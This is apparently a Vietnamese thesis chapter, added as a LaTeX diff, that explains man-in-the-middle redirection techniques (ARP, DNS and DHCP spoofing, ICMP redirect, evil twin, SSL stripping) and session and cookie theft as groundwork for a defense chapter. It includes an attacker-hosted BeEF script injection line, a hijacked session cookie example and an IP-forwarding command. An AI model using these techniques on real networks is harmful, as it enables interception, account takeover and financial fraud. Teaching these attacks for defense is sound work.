@@ -1,0 +1,193 @@
+\chapter{CÁC KỸ THUẬT KHAI THÁC VÀ DẪN ĐƯỜNG TRONG TẤN CÔNG MAN-IN-THE-MIDDLE}
+
+\section{Một số kỹ thuật dẫn đường lưu lượng (Traffic Redirection)}
+
+Để trở thành ``kẻ đứng ở giữa'', kẻ tấn công bắt buộc phải điều hướng được các gói tin mạng truyền qua card mạng của mình thay vì đi thẳng đến đích. Dưới đây là phân tích chi tiết về 6 kỹ thuật dẫn đường phổ biến và nguy hiểm nhất hiện nay.
+
+\subsection{Kỹ thuật ARP Spoofing / ARP Cache Poisoning}
+
+\subsubsection{Bản chất và nguyên lý hoạt động}
+
+Kỹ thuật ARP Spoofing (hay ARP Poisoning) lợi dụng tính chất không xác thực của giao thức ARP \cite{rfc826_arp}. Trong một mạng LAN có máy nạn nhân $V$ (IP: $IP_V$, MAC: $MAC_V$), cổng mặc định Gateway $G$ (IP: $IP_G$, MAC: $MAC_G$) và máy tấn công $A$ (IP: $IP_A$, MAC: $MAC_A$), kẻ tấn công sẽ tiến hành gửi liên tục hai luồng gói tin ARP Reply giả mạo (hai chiều) \cite{kurose2021computer}:
+\begin{enumerate}
+  \item \textbf{Gửi cho máy nạn nhân $V$:} Gói ARP Reply chứa thông điệp: \textit{``Địa chỉ IP $IP_G$ đang ứng với địa chỉ vật lý $MAC_A$''}. Kết quả: Bảng ARP Cache của nạn nhân $V$ bị cập nhật sai, nạn nhân tin rằng máy tấn công chính là Gateway.
+  \item \textbf{Gửi cho Gateway $G$:} Gói ARP Reply chứa thông điệp: \textit{``Địa chỉ IP $IP_V$ đang ứng với địa chỉ vật lý $MAC_A$''}. Kết quả: Bảng ARP Cache của Gateway bị cập nhật sai, Gateway tin rằng máy tấn công chính là nạn nhân.
+\end{enumerate}
+
+\begin{figure}[htbp]
+  \centering
+  \begin{tikzpicture}[scale=0.85, every node/.style={transform shape}]
+    \node[draw, rectangle, fill=blue!15, minimum width=2.8cm, minimum height=1.2cm, rounded corners, align=center] (victim) at (0,0) {
+      \textbf{Nạn nhân $V$}\\
+      \footnotesize IP: 192.168.10.10\\
+      \footnotesize MAC: AA:AA:AA:AA:AA:01
+    };
+    
+    \node[draw, rectangle, fill=red!20, minimum width=3.2cm, minimum height=1.4cm, rounded corners, line width=1.2pt, red!80!black, align=center] (attacker) at (6,3.5) {
+      \textbf{Attacker $A$ (Kali)}\\
+      \footnotesize IP: 192.168.10.50\\
+      \footnotesize MAC: CC:CC:CC:CC:CC:50\\
+      \footnotesize \textit{[Bật IP Forwarding = 1]}
+    };
+
+    \node[draw, rectangle, fill=green!15, minimum width=2.8cm, minimum height=1.2cm, rounded corners, align=center] (gateway) at (12,0) {
+      \textbf{Gateway $G$}\\
+      \footnotesize IP: 192.168.10.1\\
+      \footnotesize MAC: BB:BB:BB:BB:BB:01
+    };
+
+    % Đường ARP Poisoning
+    \draw[->, >=Stealth, line width=1.3pt, red, dashed] (attacker) -- node[left, rotate=25]{\footnotesize ARP Reply: IP 192.168.10.1 is MAC CC...50} (victim);
+    \draw[->, >=Stealth, line width=1.3pt, red, dashed] (attacker) -- node[right, rotate=-25]{\footnotesize ARP Reply: IP 192.168.10.10 is MAC CC...50} (gateway);
+
+    % Đường dữ liệu bị bắt
+    \draw[<->, >=Stealth, line width=1.8pt, blue!80!black] (victim) -- node[above]{\footnotesize Gói tin đến Internet} (attacker);
+    \draw[<->, >=Stealth, line width=1.8pt, blue!80!black] (attacker) -- node[above]{\footnotesize Chuyển tiếp ra ngoài} (gateway);
+  \end{tikzpicture}
+  \caption{Sơ đồ cơ chế đầu độc hai chiều ARP Cache Poisoning}
+  \label{fig:arp-poisoning-flow}
+\end{figure}
+
+Khi kẻ tấn công kích hoạt tính năng chuyển tiếp gói tin trong nhân Linux (\texttt{sysctl -w net.ipv4.ip\_forward=1}), máy của kẻ tấn công đóng vai trò một Router tàng hình ở giữa. Toàn bộ lưu lượng ra vào giữa nạn nhân và Internet đều đi qua card mạng của máy tấn công mà mạng không hề bị gián đoạn.
+
+\subsection{Kỹ thuật DNS Spoofing / DNS Cache Poisoning}
+
+Sau khi đã thực hiện thành công kỹ thuật dẫn đường ở tầng 2 bằng ARP Spoofing, kẻ tấn công hoàn toàn có thể can thiệp vào các truy vấn DNS gửi từ máy nạn nhân \cite{rfc1035_dns}.
+\begin{enumerate}
+  \item Nạn nhân nhập tên miền mong muốn vào trình duyệt, ví dụ: \texttt{banking.dthu.edu.vn}. Trình duyệt gửi gói tin UDP cổng 53 chứa truy vấn DNS Query tới DNS Server.
+  \item Máy tấn công đứng ở giữa sẽ bắt gói tin này, trích xuất mã \textbf{Transaction ID} của yêu cầu.
+  \item Kẻ tấn công tạo ngay lập tức một gói tin DNS Response giả mạo chứa Transaction ID trùng khớp, trong đó bản ghi loại A (\texttt{A Record}) trỏ về địa chỉ IP của Web Server độc hại do kẻ tấn công điều khiển (IP: 192.168.10.50).
+  \item Nạn nhân nhận được bản tin DNS Response giả mạo đầu tiên và kết nối thẳng tới trang web mạo danh mà không hề nghi ngờ.
+\end{enumerate}
+
+\subsection{Kỹ thuật DHCP Spoofing (Rogue DHCP Server)}
+
+Trong một mạng chưa được cấu hình kiểm soát cổng, kẻ tấn công có thể khởi tạo một dịch vụ máy chủ DHCP lậu (Rogue DHCP Server) \cite{rfc2131_dhcp}.
+\begin{itemize}
+  \item Để tăng tỷ lệ thành công, kẻ tấn công có thể kết hợp với kỹ thuật **DHCP Starvation**: Gửi hàng ngàn gói tin DHCP Discover với các địa chỉ MAC ngẫu nhiên khác nhau để làm cạn kiệt toàn bộ dải IP của máy chủ DHCP thật.
+  \item Khi một máy người dùng mới kết nối vào mạng và phát quảng bá gói DHCP Discover, máy chủ Rogue DHCP của kẻ tấn công sẽ lập tức phản hồi gói tin \texttt{DHCP Offer}.
+  \item Trong gói tin phản hồi này, kẻ tấn công thiết lập:
+    \begin{equation}
+      \text{Default Gateway} = IP_{\text{Attacker}}, \quad \text{DNS Server} = IP_{\text{Attacker}}
+    \end{equation}
+  \item Nạn nhân tiếp nhận thông số cấu hình mạng này, khiến 100\% lưu lượng gửi ra ngoài hoặc các truy vấn tên miền của máy tính đều tự động gửi trực tiếp về máy kẻ tấn công mà không cần dùng đến ARP Spoofing.
+\end{itemize}
+
+\subsection{Kỹ thuật ICMP Redirect}
+
+Giao thức ICMP (Internet Control Message Protocol) được các router sử dụng để thông báo cho host nguồn về một tuyến đường tốt hơn (tối ưu hơn) tới đích thông qua thông điệp ICMP Type 5 (Redirect).
+
+Kẻ tấn công có thể phát tán các gói tin ICMP Redirect giả mạo tới máy nạn nhân, thông báo rằng: ``Muốn đến địa chỉ IP máy chủ $X$, hãy chuyển hướng gói tin qua địa chỉ IP $IP_A$ thay vì gửi cho Gateway mặc định''. Nếu hệ điều hành của nạn nhân vẫn mở tính năng chấp nhận ICMP Redirect (như các phiên bản Linux cũ hoặc cấu hình mặc định), bảng định tuyến của nạn nhân sẽ bổ sung tuyến đường mới, dẫn lưu lượng đi qua máy tấn công.
+
+\subsection{Kỹ thuật Rogue AP (Evil Twin / Karma Attack)}
+
+Trong môi trường mạng không dây Wi-Fi, kỹ thuật Rogue AP tạo ra một điểm truy nhập không dây giả mạo có cùng tên định danh (SSID) và địa chỉ MAC giả mạo (BSSID) trùng với điểm truy cập hợp pháp của tổ chức.
+
+Kẻ tấn công phát sóng với công suất phát sóng cao hơn hoặc gửi các gói tin hủy xác thực (\texttt{Deauthentication Frames} theo chuẩn IEEE 802.11) để ép thiết bị của nạn nhân rớt mạng khỏi AP thật. Khi thiết bị tìm kiếm và tự động kết nối lại, nó sẽ ưu tiên kết nối vào AP giả mạo có tín hiệu mạnh hơn. Toàn bộ dữ liệu của người dùng khi này mặc nhiên đi qua Access Point do kẻ tấn công kiểm soát.
+
+\subsection{Kỹ thuật SSL Stripping (Hạ cấp HTTPS xuống HTTP)}
+
+Được công bố lần đầu bởi nhà nghiên cứu Moxie Marlinspike vào năm 2009 \cite{marlinspike2009sslstrip}, kỹ thuật SSL Stripping (bóc tách SSL) là một đòn giáng mạnh vào sự phụ thuộc của người dùng đối với biểu tượng ``ổ khóa an toàn'' trên trình duyệt.
+
+\begin{figure}[htbp]
+  \centering
+  \begin{tikzpicture}[scale=0.9, every node/.style={transform shape}]
+    \node[draw, rectangle, fill=blue!15, minimum width=2.8cm, minimum height=1.2cm, rounded corners, align=center] (client) at (0,0) {
+      \textbf{Nạn nhân (Client)}\\
+      \footnotesize \textit{Kết nối HTTP thuần}
+    };
+    
+    \node[draw, rectangle, fill=red!20, minimum width=3.4cm, minimum height=1.4cm, rounded corners, line width=1.2pt, red!80!black, align=center] (proxy) at (5.5,0) {
+      \textbf{SSL Strip Proxy}\\
+      \footnotesize (Mitmproxy / Bettercap)\\
+      \footnotesize Thay \texttt{https://} $\rightarrow$ \texttt{http://}
+    };
+
+    \node[draw, rectangle, fill=green!15, minimum width=2.8cm, minimum height=1.2cm, rounded corners, align=center] (server) at (11.5,0) {
+      \textbf{Web Server Hợp Pháp}\\
+      \footnotesize \textit{Kết nối HTTPS (TLS 1.3)}
+    };
+
+    \draw[<->, >=Stealth, line width=1.5pt, red!80!black] (client) -- node[above]{\textbf{HTTP (Bản rõ)}} node[below]{\footnotesize Bị đọc tài khoản \& cookie} (proxy);
+    \draw[<->, >=Stealth, line width=1.5pt, green!60!black] (proxy) -- node[above]{\textbf{HTTPS (TLS)}} node[below]{\footnotesize Không cảnh báo lỗi SSL} (server);
+  \end{tikzpicture}
+  \caption{Mô hình hoạt động của kỹ thuật tấn công SSL Stripping}
+  \label{fig:ssl-strip-concept}
+\end{figure}
+
+Nguyên lý tấn công diễn ra như sau:
+\begin{enumerate}
+  \item Người dùng thường chỉ gõ tên miền đơn giản vào thanh địa chỉ (ví dụ: \texttt{mybank.com}) thay vì gõ đầy đủ \texttt{https://mybank.com}. Trình duyệt mặc định gửi một yêu cầu HTTP ban đầu qua cổng 80.
+  \item Máy chủ web thật thường phản hồi mã trạng thái chuyển hướng \texttt{HTTP 301/302 Moved Permanently} với tiêu đề \texttt{Location: https://mybank.com}.
+  \item Kẻ tấn công đứng ở giữa bắt gói phản hồi chuyển hướng này và không chuyển tiếp nó cho nạn nhân. Thay vào đó, kẻ tấn công tự mình thiết lập kết nối HTTPS bảo mật với máy chủ thật.
+  \item Kẻ tấn công nhận mã HTML trả về từ máy chủ qua HTTPS, quét toàn bộ mã nguồn HTML và thay thế mọi chuỗi \texttt{https://} thành \texttt{http://}, đồng thời sửa đổi các thuộc tính liên kết thẻ \texttt{<a>} và hành động gửi form \texttt{<form action="...">}.
+  \item Kẻ tấn công gửi trang HTML đã bị sửa đổi về cho nạn nhân qua HTTP không mã hóa. Nạn nhân nhìn thấy trang web hiển thị bình thường nhưng ở giao thức HTTP. Mọi thông tin tài khoản, mật khẩu nhập vào form đều bị kẻ tấn công đọc được trực tiếp.
+\end{enumerate}
+
+\section{Một số kiểu tấn công vào phiên và dữ liệu người dùng}
+
+\subsection{Chiếm đoạt phiên làm việc (Session Hijacking)}
+
+Session Hijacking là kỹ thuật đánh cắp hoặc dự đoán mã định danh phiên (\textbf{Session ID}) của người dùng sau khi họ đã hoàn tất bước xác thực danh tính với máy chủ ứng dụng web \cite{alani2014mitm}.
+
+Khi người dùng đăng nhập thành công vào hệ thống, máy chủ ứng dụng (như PHP, Node.js, Spring Boot) sẽ cấp phát một chuỗi giá trị ngẫu nhiên đại diện cho phiên làm việc đó (ví dụ: \texttt{PHPSESSID=9a8f7c6e...}). Chuỗi này được lưu trong Cookie của trình duyệt. 
+
+Thông qua các kỹ thuật MitM bắt gói tin (như ARP Spoofing kết hợp lắng nghe gói tin HTTP), kẻ tấn công dễ dàng trích xuất tiêu đề:
+\begin{lstlisting}[language=bash]
+GET /dashboard.php HTTP/1.1
+Host: internal-portal.dthu.edu.vn
+Cookie: PHPSESSID=9a8f7c6e5d4c3b2a1098fedcba; auth_user=admin
+\end{lstlisting}
+
+Sau khi trích xuất được Session ID hợp lệ, kẻ tấn công chỉ cần tiêm Cookie này vào trình duyệt của mình (thông qua tiện ích chỉnh sửa Cookie như EditThisCookie hoặc cURL). Lúc này, máy chủ web tin rằng kẻ tấn công chính là quản trị viên hợp lệ và cấp toàn quyền truy cập hệ thống mà không hề yêu cầu nhập lại mật khẩu hay mã OTP.
+
+\subsection{Đánh cắp Cookie xác thực (Cookie Theft)}
+
+Cookie là cơ chế chủ yếu được các website hiện đại dùng để lưu trữ trạng thái người dùng. Nếu lập trình viên không áp dụng các cờ bảo mật bắt buộc, Cookie sẽ trở thành mồi ngon cho kẻ tấn công MitM:
+\begin{itemize}
+  \item \textbf{Thiếu cờ \texttt{Secure}:} Trình duyệt sẽ cho phép gửi Cookie qua kết nối HTTP không mã hóa. Kẻ tấn công MitM chỉ cần ép người dùng tải một tài nguyên HTTP bất kỳ (như hình ảnh hoặc script) là Cookie sẽ tự động bị lộ trong tiêu đề yêu cầu.
+  \item \textbf{Thiếu cờ \texttt{HttpOnly}:} Cookie có thể bị đọc trực tiếp bằng mã JavaScript trên máy khách (\texttt{document.cookie}). Kẻ tấn công MitM có thể tiêm mã JavaScript độc vào trang web để gửi Cookie về máy chủ thu thập của mình.
+  \item \textbf{Thiếu cờ \texttt{SameSite=Strict/Lax}:} Khiến Cookie dễ bị lợi dụng trong các cuộc tấn công Cross-Site Request Forgery (CSRF).
+\end{itemize}
+
+\subsection{Giả mạo nội dung (Content Tampering / Malicious Injection)}
+
+Khi luồng lưu lượng truyền thông ở dạng HTTP bản rõ đi qua máy tấn công, kẻ tấn công có quyền kiểm soát toàn bộ tải trọng (Payload) của gói tin. Kẻ tấn công có thể can thiệp theo hai hướng chính:
+\begin{enumerate}
+  \item \textbf{Chèn mã JavaScript độc hại (Code Injection):} Sử dụng công cụ proxy trung gian (như Mitmproxy, Bettercap hoặc kịch bản Scapy) để chèn thêm thẻ script vào trước thẻ đóng \texttt{</body>}:
+\begin{lstlisting}[language=html]
+<script src="http://192.168.10.50:3000/hook.js"></script>
+\end{lstlisting}
+  Đoạn mã này kết nối trình duyệt của nạn nhân vào khung kiểm thử xâm nhập trình duyệt (Browser Exploitation Framework --- BeEF). Từ đó, kẻ tấn công có thể hiển thị thông báo giả mạo yêu cầu cập nhật phần mềm, bật camera hoặc ghi lại từng phím bấm (Keylogger) của nạn nhân.
+  \item \textbf{Sửa đổi nội dung giao dịch tài chính (Data Tampering):} Khi nạn nhân thực hiện chuyển khoản hoặc gửi dữ liệu qua form POST, kẻ tấn công đón đầu gói tin và sửa đổi trường dữ liệu:
+  \begin{equation}
+    \text{account\_receiver} = 0023410647 \quad \longrightarrow \quad \text{account\_receiver} = 9999888877
+  \end{equation}
+  Máy chủ nhận được gói tin đã bị sửa đổi và xử lý lệnh chuyển tiền sang tài khoản của kẻ tấn công mà người gửi không hề hay biết.
+\end{enumerate}
+
+\section{Ma trận đối sánh các kỹ thuật dẫn đường}
+
+Bảng \ref{tab:redirection-comparison} tổng hợp và so sánh toàn diện các khía cạnh kỹ thuật của 6 kỹ thuật dẫn đường đã phân tích.
+
+\begin{table}[htbp]
+  \centering
+  \caption{Bảng so sánh các kỹ thuật dẫn đường trong tấn công MitM}
+  \label{tab:redirection-comparison}
+  \begin{tabularx}{\textwidth}{p{3.2cm} p{1.8cm} p{2.2cm} L p{2.5cm}}
+    \toprule
+    \textbf{Kỹ thuật} & \textbf{Tầng mạng} & \textbf{Phạm vi tác động} & \textbf{Cơ chế can thiệp} & \textbf{Độ phức tạp khai thác} \\
+    \midrule
+    \textbf{ARP Spoofing} & Tầng 2 (Data Link) & Mạng LAN nội bộ & Gửi bản tin ARP Reply giả mạo để đầu độc ARP Cache & Thấp (Phổ biến nhất) \\
+    \textbf{DNS Spoofing} & Tầng 7 (Application) & Toàn mạng LAN hoặc Internet & Làm sai lệch phản hồi DNS để trỏ IP về máy độc hại & Trung bình \\
+    \textbf{DHCP Spoofing} & Tầng 7 (Application) & Mạng LAN nội bộ & Thiết lập Rogue DHCP Server cấp phát Gateway giả & Thấp -- Trung bình \\
+    \textbf{ICMP Redirect} & Tầng 3 (Network) & Mạng LAN nội bộ & Gửi thông điệp ICMP Type 5 ép thay đổi bảng định tuyến & Cao (Nhiều OS chặn) \\
+    \textbf{Rogue AP} & Tầng 1-2 (Vô tuyến) & Vùng phủ sóng Wi-Fi & Nhân bản SSID/BSSID để thu hút thiết bị di động & Trung bình \\
+    \textbf{SSL Stripping} & Tầng 7 (Application) & Cần có MitM trước & Đón đầu chuyển hướng 301/302, hạ cấp HTTPS xuống HTTP & Trung bình \\
+    \bottomrule
+  \end{tabularx}
+\end{table}
+
+\section{Tổng kết chương}
+
+Các kỹ thuật dẫn đường và tấn công vào phiên dữ liệu thể hiện rõ tính tinh vi và mức độ nguy hiểm của tấn công Man-in-the-Middle. Việc triển khai đơn lẻ một biện pháp phòng vệ là không đủ để bảo vệ toàn diện hệ thống. Chương 3 sẽ trình bày chi tiết về mô hình phòng thí nghiệm thực nghiệm, thiết kế các giải pháp phòng thủ đa lớp (Defense-in-Depth) và kiểm chứng hiệu quả vô hiệu hóa các cuộc tấn công này.
